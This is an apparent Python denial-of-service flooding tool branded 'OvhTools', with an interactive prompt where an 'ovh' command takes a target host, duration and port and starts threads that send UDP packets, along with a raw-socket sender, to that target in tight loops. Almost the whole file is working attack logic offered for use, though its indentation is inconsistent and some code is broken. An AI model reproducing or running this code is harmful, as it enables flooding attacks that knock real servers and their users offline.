import sys

import socket

import time

import random

import threading

import getpass

import os

import urllib

import json

from time import sleep

nicknm = "WizzVIP"

banner =  """







"""

attacked = """

Paket Otiwi Massehh

"""

fsubs = True

tpings = True

pscans = True

liips = True

tattacks = True

uaid = True

said = True

running = True

iaid = True

haid = True

aid = True

attack = True

ldap = True

http = True

atks = True



def randsender(host, timer, port, punch):

	global iaid
	global aid

	global tattacks

	global running



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)



	iaid += 1

	aid += 1

	tattacks += 1

	running += 1

	while time.time() < timeout and ldap and attack:

		sock.sendto(punch, (host, int(port)))

	running -= 1

	iaid -= 1

	aid -= 1

              

              





def stdsender(host, port, timer, payload):

	global atks

	global running



	timeout = time.time() + float(timer)

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	

	atks += 1

	running += 1

	while time.time() < timeout and attack:

		sock.sendto(payload, (host, int(port)))

		sock.sendto(payload, (host, int(port)))

		sock.sendto(payload, (host, int(port)))

		sock.sendto(payload, (host, int(port)))

		sock.sendto(payload, (host, int(port)))

		sock.sendto(payload, (host, int(port)))

		sock.sendto(payload, (host, int(port)))

		sock.sendto(payload, (host, int(port)))

	atks -= 1

	running -= 1



def main():

	global fsubs

	global tpings

	global pscans

	global liips

	global tattacks

	global uaid

	global running

	global atk

	global ldap

	global said

	global iaid

	global haid

	global aid

	global attack

	global dp

	while True:



		powerran = (random.randint(30,100))



		sys.stdout.write("\x1b]2;[-] OvhTools | Api Connected [1] | Backup Server [1] | Online User [10] | Admin: WizzVIP | POWER : {}% [UNSTABLE]\x07".format (powerran))

		sin = input("\033[0;36m{}\033[0;34m@[OVHTOLS]\033[36m--> \033[0;31m".format(nicknm)).lower()

		sinput = sin.split(" ")[0]

		if sinput == "clear":

		  os.system ("clear")

		  print (banner)

		  main()

	  elif sinput == "ovh":

	    try:

	      if running >= 20000:

	        print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")

	        main()

	      else:

	        sinput, host, timer, port = sin.split(" ")

	        socket.gethostbyname(host)

	        payload = b"\x00\x02\x00\x2f"

	        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()

	        os.system('clear')

	        print(attacked)

	     except ValueError:

	       main()

	     except socket.gaierror:

	       main()
